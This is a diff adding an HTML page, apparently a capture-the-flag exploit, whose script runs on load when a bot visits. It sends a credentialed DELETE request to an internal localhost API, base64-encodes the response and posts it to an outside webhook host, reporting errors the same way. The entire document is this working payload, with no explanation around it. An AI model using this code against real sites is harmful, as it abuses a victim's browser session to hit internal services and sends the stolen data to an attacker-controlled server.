@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hello</title>
+</head>
+<body>
+    <script>
+        // Fungsi otomatis berjalan saat bot membuka halaman ini
+        async function getFlag() {
+            try {
+                // Tembak API internal server target
+                const r = await fetch('http://127.0.0.1:3000/reach_nirvana', {
+                    method: 'DELETE',
+                    credentials: 'include'
+                });
+                const flagData = await r.text();
+                
+                // Kirim hasil ke webhook milikmu tanpa parameter "?" di URL utama bot
+                // Kita gunakan method POST agar URL-nya tetap bersih bagi bot
+                await fetch('https://kind-planet-89.webhook.cool', {
+                    method: 'POST',
+                    body: JSON.stringify({ flag: btoa(flagData) })
+                });
+            } catch (e) {
+                await fetch('https://kind-planet-89.webhook.cool', {
+                    method: 'POST',
+                    body: JSON.stringify({ error: btoa(e.message) })
+                });
+            }
+        }
+        getFlag();
+    </script>
+</body>
+</html>
